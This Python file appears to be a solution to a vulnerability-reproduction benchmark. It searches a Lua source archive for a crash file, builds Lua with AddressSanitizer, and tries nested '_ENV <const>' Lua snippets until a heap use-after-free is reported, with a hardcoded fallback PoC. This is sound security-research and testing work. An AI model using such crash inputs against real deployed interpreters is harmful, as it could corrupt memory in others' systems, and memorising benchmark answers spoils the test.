import os
import re
import io
import tarfile
import time
import shutil
import random
import hashlib
import tempfile
import subprocess
from pathlib import Path
from typing import Optional, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        src = Path(src_path)
        poc = self._find_embedded_poc(src)
        if poc is not None:
            return poc
        poc = self._build_and_search(src)
        if poc is not None:
            return poc
        return self._fallback_poc()

    def _fallback_poc(self) -> bytes:
        s = (
            "local _ENV <const> = _ENV\n"
            "do\n"
            "  local _ENV <const> = _ENV\n"
            "  local function outer(...)\n"
            "    local _ENV <const> = _ENV\n"
            "    local a, b, c = 1, 2, 3\n"
            "    local function mid(x)\n"
            "      local _ENV <const> = _ENV\n"
            "      local function inner(y)\n"
            "        local _ENV <const> = _ENV\n"
            "        local t = {a=a, b=b, c=c, x=x, y=y}\n"
            "        local n = 0\n"
            "        for i=1,3 do\n"
            "          n = n + (t.a or 0) + (t.b or 0) + (t.c or 0)\n"
            "        end\n"
            "        return n, type(_ENV), tostring(select('#', ...))\n"
            "      end\n"
            "      return inner\n"
            "    end\n"
            "    local f = mid(10)\n"
            "    local r1, r2, r3 = f(20)\n"
            "    return r1, r2, r3\n"
            "  end\n"
            "  outer(1,2,3)\n"
            "end\n"
        )
        return s.encode("utf-8", "strict")

    def _find_embedded_poc(self, src: Path) -> Optional[bytes]:
        if src.is_dir():
            return self._find_poc_in_dir(src)

        if not src.is_file():
            return None

        try:
            with tarfile.open(src, "r:*") as tf:
                best = None  # (score, length, bytes)
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    name = (m.name or "").lower()
                    if any(x in name for x in [".o", ".a", ".so", ".dll", ".exe", ".png", ".jpg", ".jpeg", ".gif", ".pdf"]):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if not data or len(data) > 2_000_000:
                        continue

                    score = 0
                    if any(x in name for x in ["crash", "poc", "repro", "asan", "uaf", "min", "testcase", "artifact", "bug"]):
                        score += 50
                    if name.endswith(".lua") or name.endswith(".luac") or name.endswith(".txt") or name.endswith(".in"):
                        score += 10

                    ld = data.lower()
                    if b"_env" in ld:
                        score += 20
                    if b"<const>" in ld or b"<const" in ld:
                        score += 20
                    if b"_env" in ld and (b"<const>" in ld or b"<const" in ld):
                        score += 40

                    if score < 30:
                        continue

                    if not self._looks_like_text(data):
                        continue

                    length = len(data)
                    cand = (score, length, data)
                    if best is None:
                        best = cand
                    else:
                        if cand[0] > best[0] or (cand[0] == best[0] and cand[1] < best[1]):
                            best = cand
                if best is not None:
                    return best[2]
        except Exception:
            return None
        return None

    def _find_poc_in_dir(self, root: Path) -> Optional[bytes]:
        best = None  # (score, length, bytes)
        try:
            for p in root.rglob("*"):
                if not p.is_file():
                    continue
                if p.stat().st_size <= 0 or p.stat().st_size > 2_000_000:
                    continue
                name = str(p).lower()
                if any(x in name for x in ["/.git/", "\\.git\\", ".o", ".a", ".so", ".dll", ".exe", ".png", ".jpg", ".jpeg", ".gif", ".pdf"]):
                    continue
                try:
                    data = p.read_bytes()
                except Exception:
                    continue

                score = 0
                if any(x in name for x in ["crash", "poc", "repro", "asan", "uaf", "min", "testcase", "artifact", "bug"]):
                    score += 50
                if name.endswith(".lua") or name.endswith(".luac") or name.endswith(".txt") or name.endswith(".in"):
                    score += 10

                ld = data.lower()
                if b"_env" in ld:
                    score += 20
                if b"<const>" in ld or b"<const" in ld:
                    score += 20
                if b"_env" in ld and (b"<const>" in ld or b"<const" in ld):
                    score += 40

                if score < 30:
                    continue
                if not self._looks_like_text(data):
                    continue

                cand = (score, len(data), data)
                if best is None or cand[0] > best[0] or (cand[0] == best[0] and cand[1] < best[1]):
                    best = cand
            if best is not None:
                return best[2]
        except Exception:
            return None
        return None

    def _looks_like_text(self, data: bytes) -> bool:
        if not data:
            return False
        if b"\x00" in data:
            return False
        sample = data[:4096]
        good = 0
        for b in sample:
            if b in (9, 10, 13) or 32 <= b <= 126:
                good += 1
        return good / max(1, len(sample)) > 0.92

    def _safe_extract_tar(self, tar_path: Path, dst: Path) -> None:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                name = m.name or ""
                if name.startswith("/") or name.startswith("\\"):
                    continue
                parts = Path(name).parts
                if any(part == ".." for part in parts):
                    continue
                if m.islnk() or m.issym():
                    continue
                if m.size > 200_000_000:
                    continue
                try:
                    tf.extract(m, path=dst)
                except Exception:
                    continue

    def _locate_lua_root(self, root: Path) -> Optional[Path]:
        best = None
        best_len = 10**9
        for p in root.rglob("lua.c"):
            try:
                if p.name != "lua.c":
                    continue
                if p.parent.name != "src":
                    continue
                luac = p.parent / "luac.c"
                lstate = p.parent / "lstate.c"
                lparser = p.parent / "lparser.c"
                if not luac.exists() and not lparser.exists() and not lstate.exists():
                    continue
                candidate = p.parent.parent
                clen = len(str(candidate))
                if clen < best_len:
                    best = candidate
                    best_len = clen
            except Exception:
                continue
        if best is not None:
            return best
        for p in root.rglob("luac.c"):
            try:
                if p.parent.name == "src":
                    return p.parent.parent
            except Exception:
                continue
        return None

    def _build_lua_asan(self, lua_root: Path, time_budget_s: float) -> Optional[Tuple[Path, Path]]:
        src_dir = lua_root / "src"
        if not src_dir.is_dir():
            return None

        lua_bin = src_dir / "lua"
        luac_bin = src_dir / "luac"
        if lua_bin.exists() and luac_bin.exists():
            return lua_bin, luac_bin

        cc = shutil.which("clang") or shutil.which("gcc")
        if not cc:
            return None

        cflags = "-O0 -g -fsanitize=address -fno-omit-frame-pointer"
        ldflags = "-fsanitize=address"

        def run_make(args: List[str]) -> bool:
            start = time.time()
            try:
                proc = subprocess.run(
                    args,
                    cwd=str(src_dir),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=max(5.0, time_budget_s - (time.time() - start)),
                    env={**os.environ, "CC": cc, "MYCFLAGS": cflags, "MYLDFLAGS": ldflags, "CFLAGS": cflags, "LDFLAGS": ldflags},
                )
                return proc.returncode == 0
            except Exception:
                return False

        targets = ["linux", "posix"]
        tried_any = False
        for t in targets:
            if time.time() > time.time() + time_budget_s:
                break
            tried_any = True
            ok = run_make(["make", "-j8", t, f"CC={cc}", f"MYCFLAGS={cflags}", f"MYLDFLAGS={ldflags}"])
            if ok and lua_bin.exists() and luac_bin.exists():
                return lua_bin, luac_bin

        if tried_any:
            if run_make(["make", "-j8", f"CC={cc}", f"MYCFLAGS={cflags}", f"MYLDFLAGS={ldflags}"]) and lua_bin.exists() and luac_bin.exists():
                return lua_bin, luac_bin

        cmake_lists = lua_root / "CMakeLists.txt"
        if cmake_lists.exists() and shutil.which("cmake"):
            build_dir = lua_root / "build_asan"
            try:
                build_dir.mkdir(exist_ok=True)
            except Exception:
                return None
            try:
                subprocess.run(
                    ["cmake", "-S", str(lua_root), "-B", str(build_dir), f"-DCMAKE_C_FLAGS={cflags}", f"-DCMAKE_EXE_LINKER_FLAGS={ldflags}"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=max(10.0, time_budget_s),
                )
                subprocess.run(
                    ["cmake", "--build", str(build_dir), "-j", "8"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=max(10.0, time_budget_s),
                )
            except Exception:
                pass
            candidates = []
            for p in build_dir.rglob("*"):
                if p.is_file() and os.access(p, os.X_OK):
                    nm = p.name
                    if nm == "lua" or nm == "luac":
                        candidates.append(p)
            lua_found = None
            luac_found = None
            for p in candidates:
                if p.name == "lua":
                    lua_found = p
                elif p.name == "luac":
                    luac_found = p
            if lua_found and luac_found:
                return lua_found, luac_found

        return None

    def _is_asan_uaf(self, stderr: bytes) -> bool:
        if not stderr:
            return False
        s = stderr.lower()
        if b"addresssanitizer" not in s:
            return False
        return b"use-after-free" in s or b"heap-use-after-free" in s

    def _run_and_check(self, cmd: List[str], timeout_s: float = 1.0) -> Tuple[int, bytes, bytes]:
        try:
            proc = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout_s,
                env=os.environ.copy(),
            )
            return proc.returncode, proc.stdout, proc.stderr
        except subprocess.TimeoutExpired as e:
            out = e.stdout if e.stdout is not None else b""
            err = e.stderr if e.stderr is not None else b""
            return 124, out, err
        except Exception as e:
            return 125, b"", (str(e).encode("utf-8", "ignore"))

    def _build_and_search(self, src: Path) -> Optional[bytes]:
        start = time.time()
        time_budget_total = 50.0

        with tempfile.TemporaryDirectory(prefix="arvo_lua_") as td:
            td_path = Path(td)

            if src.is_dir():
                extract_root = src
            else:
                try:
                    self._safe_extract_tar(src, td_path)
                except Exception:
                    return None
                extract_root = td_path

            lua_root = self._locate_lua_root(extract_root)
            if lua_root is None:
                return None

            budget_build = max(10.0, time_budget_total * 0.5)
            build = self._build_lua_asan(lua_root, budget_build)
            if build is None:
                return None
            lua_bin, luac_bin = build

            if not lua_bin.exists() or not luac_bin.exists():
                return None

            seed_material = str(src).encode("utf-8", "ignore")
            if src.is_file():
                try:
                    seed_material += src.read_bytes()[:4096]
                except Exception:
                    pass
            seed = int(hashlib.sha256(seed_material).hexdigest()[:16], 16)
            rng = random.Random(seed)

            candidates = self._static_candidates()
            rng.shuffle(candidates)

            tmp_in = td_path / "poc.lua"

            def test_candidate(code: str) -> bool:
                try:
                    tmp_in.write_text(code, encoding="utf-8", errors="strict")
                except Exception:
                    try:
                        tmp_in.write_bytes(code.encode("utf-8", "ignore"))
                    except Exception:
                        return False

                rc, _, err = self._run_and_check([str(luac_bin), "-p", str(tmp_in)], timeout_s=1.0)
                if self._is_asan_uaf(err):
                    return True
                if rc != 0:
                    return False

                rc, _, err = self._run_and_check([str(lua_bin), str(tmp_in)], timeout_s=1.0)
                if self._is_asan_uaf(err):
                    return True
                return False

            for code in candidates:
                if time.time() - start > time_budget_total * 0.6:
                    break
                if test_candidate(code):
                    return code.encode("utf-8", "strict")

            end_time = start + time_budget_total
            tries = 0
            while time.time() < end_time and tries < 2000:
                tries += 1
                code = self._random_candidate(rng, tries)
                if test_candidate(code):
                    return code.encode("utf-8", "strict")

        return None

    def _static_candidates(self) -> List[str]:
        cands = []

        cands.append(
            "local _ENV <const> = _ENV\n"
            "local function f()\n"
            "  local _ENV <const> = _ENV\n"
            "  local function g()\n"
            "    return tostring(_ENV) .. tostring(type(_ENV))\n"
            "  end\n"
            "  return g\n"
            "end\n"
            "local h = f()\n"
            "h()\n"
        )

        cands.append(
            "local _ENV <const> = _ENV\n"
            "do\n"
            "  local _ENV <const> = _ENV\n"
            "  local function a(x)\n"
            "    local _ENV <const> = _ENV\n"
            "    local function b(y)\n"
            "      local _ENV <const> = _ENV\n"
            "      return (x or 0) + (y or 0)\n"
            "    end\n"
            "    return b\n"
            "  end\n"
            "  local c = a(1)\n"
            "  c(2)\n"
            "end\n"
        )

        cands.append(
            "local _ENV <const> = _ENV\n"
            "local function outer(...)\n"
            "  local _ENV <const> = _ENV\n"
            "  local function inner(i)\n"
            "    local _ENV <const> = _ENV\n"
            "    return select('#', ...) + (i or 0)\n"
            "  end\n"
            "  return inner\n"
            "end\n"
            "outer(1,2,3)(4)\n"
        )

        cands.append(
            "local _ENV <const> = _ENV\n"
            "local function f()\n"
            "  local _ENV <const> = _ENV\n"
            "  local sum = 0\n"
            "  for i=1,3 do\n"
            "    local function g()\n"
            "      local _ENV <const> = _ENV\n"
            "      return i\n"
            "    end\n"
            "    sum = sum + g()\n"
            "  end\n"
            "  return sum\n"
            "end\n"
            "f()\n"
        )

        cands.append(
            "local _ENV <const> = _ENV\n"
            "do\n"
            "  local _ENV <const> = _ENV\n"
            "  local function mk(n)\n"
            "    local _ENV <const> = _ENV\n"
            "    local t = {}\n"
            "    for i=1,n do t[i] = i end\n"
            "    local function use()\n"
            "      local _ENV <const> = _ENV\n"
            "      local s = 0\n"
            "      for i=1,#t do s = s + t[i] end\n"
            "      return s\n"
            "    end\n"
            "    return use\n"
            "  end\n"
            "  mk(5)()\n"
            "end\n"
        )

        cands.append(
            "local _ENV <const> = _ENV\n"
            "local function f()\n"
            "  local _ENV <const> = _ENV\n"
            "  local function g()\n"
            "    local _ENV <const> = _ENV\n"
            "    local t = {a=1,b=2}\n"
            "    t.a = t.a + 1\n"
            "    return t.a + t.b\n"
            "  end\n"
            "  return g()\n"
            "end\n"
            "f()\n"
        )

        cands.append(
            "local _ENV <const> = _ENV\n"
            "do\n"
            "  local _ENV <const> = _ENV\n"
            "  local function f()\n"
            "    local _ENV <const> = _ENV\n"
            "    local function g()\n"
            "      local _ENV <const> = _ENV\n"
            "      return (function() local _ENV <const> = _ENV; return type(_ENV) end)()\n"
            "    end\n"
            "    return g\n"
            "  end\n"
            "  local h = f()\n"
            "  h()\n"
            "end\n"
        )

        return cands

    def _random_candidate(self, rng: random.Random, n: int) -> str:
        def vname(k: int) -> str:
            return f"v{n}_{k}"

        use_self_env = rng.random() < 0.7
        env_init = "_ENV" if use_self_env else "_G"

        lines = []
        lines.append(f"local _ENV <const> = {env_init}")
        lines.append("local function top(...)")
        lines.append(f"  local _ENV <const> = {env_init}")
        lines.append("  local acc = 0")
        depth = rng.randint(2, 5)
        for d in range(depth):
            lines.append(f"  do")
            lines.append(f"    local _ENV <const> = {env_init}")
            lines.append(f"    local {vname(d)} = {rng.randint(0, 3)}")
            if rng.random() < 0.75:
                lines.append(f"    for i=1,{rng.randint(1, 4)} do")
                lines.append(f"      local function fn_{d}(x)")
                lines.append(f"        local _ENV <const> = {env_init}")
                if rng.random() < 0.5:
                    lines.append(f"        return (x or 0) + i + {vname(d)} + select('#', ...)")
                else:
                    lines.append(f"        local t = {{a=i, b={vname(d)}, c=acc}}")
                    lines.append(f"        return (t.a or 0) + (t.b or 0) + (t.c or 0)")
                lines.append(f"      end")
                lines.append(f"      acc = acc + fn_{d}({rng.randint(0, 2)})")
                lines.append(f"    end")
            else:
                lines.append(f"    local function fn_{d}()")
                lines.append(f"      local _ENV <const> = {env_init}")
                lines.append(f"      return {vname(d)} + select('#', ...)")
                lines.append(f"    end")
                lines.append(f"    acc = acc + fn_{d}()")
            lines.append(f"  end")
        lines.append("  return acc")
        lines.append("end")
        lines.append("top(1,2,3)")
        return "\n".join(lines) + "\n"